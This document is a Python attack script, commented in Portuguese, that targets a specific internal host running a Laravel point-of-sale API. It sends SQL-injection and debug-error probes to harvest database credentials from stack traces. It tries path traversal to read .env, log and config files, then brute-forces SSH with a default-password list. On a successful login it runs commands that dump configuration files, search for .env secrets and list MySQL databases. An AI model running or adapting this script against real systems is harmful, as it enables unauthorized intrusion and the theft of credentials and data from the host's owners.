import socket
import sys
import json
import urllib.request
import urllib.error

HOST = "172.30.1.12"

# ==========================================
# 1. FORÇAR LARAVEL A VAZAR CREDENCIAIS DB
#    O debug mode está ON - erros de DB podem
#    mostrar host/user/password na stack trace
# ==========================================
print("=" * 55)
print("  TENTATIVA 1: Forçar vazamento via Laravel Debug")
print("=" * 55)

# Enviar requests que causem erros de banco
error_urls = [
    # Endpoints que existem mas dão erro 500 (stack trace)
    "http://172.30.1.12:8080/api/import/users",
    "http://172.30.1.12:8080/api/restaurantum/login",
    "http://172.30.1.12:8080/api/restaurantum/groups",
    "http://172.30.1.12:8080/api/restaurantum/tables",
    "http://172.30.1.12:8080/api/omni/methods",
    "http://172.30.1.12:8080/api/omni/payments/create",
    # Tentar SQL injection na API para forçar erro de DB com credenciais
    "http://172.30.1.12:8080/api/restaurantum/plu?id=1'",
    "http://172.30.1.12:8080/api/restaurantum/order?id=1'",
    "http://172.30.1.12:8080/import/user",
]

keywords = ["DB_HOST", "DB_PASSWORD", "DB_USERNAME", "DB_DATABASE",
            "password", "mysql", "pgsql", "connection refused",
            "SQLSTATE", "Access denied", "credentials", ".env",
            "forge", "homestead", "secret", "APP_KEY", "DB_PORT"]

for url in error_urls:
    try:
        req = urllib.request.Request(url)
        if "login" in url:
            req = urllib.request.Request(url, data=b'{"username":"test"}',
                                         headers={"Content-Type": "application/json"})
        elif "create" in url or "import" in url:
            req = urllib.request.Request(url, data=b'{"test":1}',
                                         headers={"Content-Type": "application/json"})
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
    except Exception as e:
        body = str(e)
        continue

    found = []
    for kw in keywords:
        if kw.lower() in body.lower():
            found.append(kw)

    if found:
        print(f"\n  [!] {url}")
        print(f"      Keywords: {found}")
        # Extrair contexto ao redor das keywords
        for kw in found:
            idx = body.lower().find(kw.lower())
            if idx > -1:
                start = max(0, idx - 80)
                end = min(len(body), idx + 120)
                snippet = body[start:end].replace("\n", " ").strip()
                print(f"      ...{snippet}...")

# ==========================================
# 2. TENTAR LER ARQUIVOS DE CONFIG VIA API
#    Path traversal na API Laravel
# ==========================================
print("\n" + "=" * 55)
print("  TENTATIVA 2: Path Traversal na API Laravel")
print("=" * 55)

traversal_urls = [
    # Tentar ler .env via path traversal
    "http://172.30.1.12:8080/../../.env",
    "http://172.30.1.12:8080/../../../.env",
    "http://172.30.1.12:8080/..%2f..%2f..%2f.env",
    "http://172.30.1.12:8080/%2e%2e/%2e%2e/.env",
    # Tentar ler o emporium.conf (path descoberto via cookie)
    "http://172.30.1.12:8080/../../excribo/etc/emporium.conf",
    # Tentar ler config do setup.php via porta 80
    "http://172.30.1.12/config.inc.php",
    # Tentar ler artisan (revela root path)
    "http://172.30.1.12:8080/artisan",
    "http://172.30.1.12:8080/storage/logs/laravel.log",
    "http://172.30.1.12:8080/storage/framework/.gitignore",
    "http://172.30.1.12:8080/bootstrap/cache/config.php",
]

for url in traversal_urls:
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        body = resp.read().decode("utf-8", errors="replace")
        if body and len(body) > 0:
            print(f"\n  [200] {url} (size: {len(body)})")
            # Checar se tem credenciais
            if any(k in body for k in ["DB_", "password", "mysql", "SECRET", "APP_KEY"]):
                print(f"  *** CREDENCIAIS ENCONTRADAS! ***")
            print(f"  {body[:500]}")
    except urllib.error.HTTPError as e:
        code = e.code
        if code != 404:
            body = e.read().decode("utf-8", errors="replace")
            if len(body) < 500 and any(k in body for k in ["DB_", "password"]):
                print(f"  [{code}] {url} => {body[:300]}")
    except:
        pass

# ==========================================
# 3. SSH BRUTE FORCE
# ==========================================
print("\n" + "=" * 55)
print("  TENTATIVA 3: SSH Brute Force")
print("=" * 55)

try:
    import paramiko
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "-q"])
    import paramiko

import warnings
warnings.filterwarnings("ignore")

ssh_creds = [
    ("root", "root"), ("root", ""), ("root", "toor"), ("root", "admin"),
    ("root", "123456"), ("root", "password"), ("root", "emporium"),
    ("admin", "admin"), ("admin", ""), ("admin", "123456"), ("admin", "password"),
    ("emporium", "emporium"), ("emporium", "admin"), ("emporium", "123456"),
    ("ubuntu", "ubuntu"), ("ubuntu", ""), ("user", "user"), ("user", "123456"),
    ("adm", "adm"), ("adm", "admin"), ("deploy", "deploy"),
    ("conecto", "conecto"), ("moderator", "moderator"),
    ("pi", "raspberry"), ("vagrant", "vagrant"), ("test", "test"),
    ("oracle", "oracle"), ("postgres", "postgres"), ("mysql", "mysql"),
    ("ftpuser", "ftpuser"), ("www-data", "www-data"),
]

for user, pw in ssh_creds:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, port=22, username=user, password=pw, timeout=5,
                       allow_agent=False, look_for_keys=False)
        print(f"\n  *** SSH LOGIN: {user}/{pw} ***")
        
        # Executar comandos
        stdin, stdout, stderr = client.exec_command("cat /app/emporium/excribo/etc/emporium.conf 2>/dev/null || echo 'NOT FOUND'")
        print(f"  emporium.conf: {stdout.read().decode()[:500]}")
        
        stdin, stdout, stderr = client.exec_command("find / -name '.env' -type f 2>/dev/null | head -5")
        print(f"  .env files: {stdout.read().decode()[:300]}")
        
        stdin, stdout, stderr = client.exec_command("cat /app/emporium/moderator/html/webservice/emporium_api/.env 2>/dev/null || echo 'NOT FOUND'")
        env_content = stdout.read().decode()
        print(f"  Laravel .env: {env_content[:500]}")
        
        stdin, stdout, stderr = client.exec_command("mysql -e 'SHOW DATABASES' 2>/dev/null || echo 'MySQL CLI not available'")
        print(f"  MySQL: {stdout.read().decode()[:300]}")
        
        client.close()
        break
    except paramiko.ssh_exception.AuthenticationException:
        continue
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("  SSH nao acessivel")
        break
    except Exception as e:
        if "timed out" in str(e):
            continue
        print(f"  {user}/{pw}: {e}")
        continue
else:
    print("  Nenhuma credencial SSH padrao funcionou")

print("\n" + "=" * 55)
print("  SCAN COMPLETO")
print("=" * 55)
